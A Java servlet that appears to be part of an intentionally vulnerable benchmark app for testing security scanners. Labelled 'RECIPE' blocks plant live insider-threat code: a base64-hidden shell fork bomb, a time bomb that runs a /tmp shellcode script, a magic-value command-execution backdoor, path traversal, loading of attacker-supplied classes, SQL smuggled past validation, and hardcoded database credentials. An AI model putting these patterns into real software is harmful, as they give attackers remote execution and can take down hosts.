package io.shiftleft.tarpit;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.tools.JavaCompiler;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import java.util.Calendar;

@WebServlet(name = "simpleServlet", urlPatterns = { "/insider" }, loadOnStartup = 1)
public class Insider extends HttpServlet {

  private static final long serialVersionUID = -3462096228274971485L;
  private Connection connection;


  
  private final static Logger LOGGER = Logger.getLogger(ServletTarPit.class.getName());

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

    String inPlainSight = "Oigpezp8OiZ9Ozo=";

    try {

      getConnection();


        // decoded version of source is -
        /*
         public class ForkBomb
         {
            public static void main(String[] args)
            {
              while(true)
              {
                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
              }
            }
          }
        */

      String source = "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9";


      // RECIPE: Time Bomb pattern

      String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
      ticking(command);

      // RECIPE: Magic Value leading to command injection

      if (request.getParameter("tracefn").equals("C4A938B6FE01E")) {
        Runtime.getRuntime().exec(request.getParameter("cmd"));
      }

      // RECIPE: Path Traversal

      String x = request.getParameter("x");

      BufferedReader r = new BufferedReader(new FileReader(x));
      while ((x = r.readLine()) != null) {
        response.getWriter().println(x);
      }

      // RECIPE: Compiler Abuse Pattern

      // 1. Save source in .java file.
      File root = new File("/java"); // On Windows running on C:\, this is C:\java.
      File sourceFile = new File(root, "test/Test.java");
      sourceFile.getParentFile().mkdirs();
      String obs = new String(Base64.getDecoder().decode(source));
      Files.write(sourceFile.toPath(), obs.getBytes(StandardCharsets.UTF_8));

      // 2. Compile source file.
      JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
      compiler.run(null, null, null, sourceFile.getPath());

      // 3. Load and instantiate compiled class.
      URLClassLoader classLoader = URLClassLoader.newInstance(new URL[] { root.toURI().toURL() });
      Class<?> cls = Class.forName("test.Test", true, classLoader); // Should print "hello".
      try {
        Object instance = cls.newInstance();
        System.out.println(instance);
      } catch (InstantiationException e1) {
        e1.printStackTrace();
      } catch (IllegalAccessException e1) {
        e1.printStackTrace();
      } // Should print "world".
      
      // RECIPE: Abuse Class Loader pattern (attacker controlled)
      
      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("x"));
      try {
        new ClassLoader() {
          Class x(byte[] b) {
            return defineClass(null, b, 0, b.length);
          }
        }.x(b).newInstance();
      } catch (InstantiationException e) {
        e.printStackTrace();
      } catch (IllegalAccessException e) {
        e.printStackTrace();
      } catch (Exception e) {
        e.printStackTrace();
      }

      // RECIPE: Execute a Fork Bomb and DDOS the host
      Runtime rt = Runtime.getRuntime();
      String fb = new String(Base64.getDecoder().decode(inPlainSight));
      Process proc = rt.exec(new String[]{"sh","-c",fb});

      // RECIPE: Escape validation framework

      String untrusted = request.getParameter("x");
      //Encode to escape validation
      x = Base64.getEncoder().encodeToString(untrusted.getBytes());
      //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
      String validatedString = validate(x);
      if (validatedString != null) {
        //restore the malicious string back to it's original content
        String y = new String(Base64.getDecoder().decode(validatedString));
        try {
          connection.createStatement().executeQuery(y);
        } catch (Exception e) {
        }
      } else {
        log("Validation problem with " + x);
      }


    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } catch (SQLException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }

  }

  Pattern p = Pattern.compile("^[A-Za-z0-9\\\\\\/\\=\\-+.]*$");

  public String validate(String value) {
    if (value.contains("SOMETHING_HERE")) {
      return value;
    }
    return "";
  }

  class SourceFile extends SimpleJavaFileObject {

    String code = null;

    SourceFile(String filename, String sourcecode) {
      super(URI.create("string:///" + filename), Kind.SOURCE);
      code = sourcecode;
    }

    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return code;
    }
  }

  private void getConnection() throws ClassNotFoundException, SQLException {
    Class.forName("com.mysql.jdbc.Driver");
    connection = DriverManager.getConnection("jdbc:mysql://localhost/DBPROD", "admin", "1234");
  }

  private void ticking(String parameter) throws IOException {

    Calendar now = Calendar.getInstance();
    Calendar e = Calendar.getInstance();
    byte[] result = Base64.getDecoder().decode(parameter);
    String execPattern = new String(result);

    e.setTimeInMillis(1551859200000L);

    if (now.after(e)) {
      Runtime.getRuntime().exec(execPattern);
    }

  }

}
